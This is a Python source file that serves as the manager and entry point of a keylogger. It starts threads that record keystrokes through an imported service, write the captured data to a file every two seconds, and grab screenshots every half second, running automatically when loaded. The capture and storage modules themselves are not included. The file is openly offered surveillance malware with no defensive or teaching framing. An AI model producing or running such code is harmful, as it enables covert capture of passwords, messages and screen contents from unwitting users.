from WRITE_TO_FILE import FileWriter
from KEYLOGGER_SERVICE import KeyloggerService

import json
import time
import keyboard
import os
import pygetwindow
from cryptography.fernet import Fernet
import threading
from getmac import get_mac_address
from PIL import ImageGrab




class KeyLoggerManager:
    def __init__(self):
        self.__instance = KeyloggerService()

    def start(self):
        self.__instance._start()

    def write_file(self):
        FileWriter.write_to_file(self.__instance.data)

    def __thread_take_shot(self):
        while True:
            self.__instance._take_shot()
            time.sleep(0.5)

    def __write_file(self):
        while True:
            self.write_file()
            time.sleep(2)

    def main(self):
        threading.Thread(target=self.start).start()
        threading.Thread(target=self.__write_file).start()
        threading.Thread(target=self.__thread_take_shot).start()


a=KeyLoggerManager()
KeyLoggerManager.main(a)
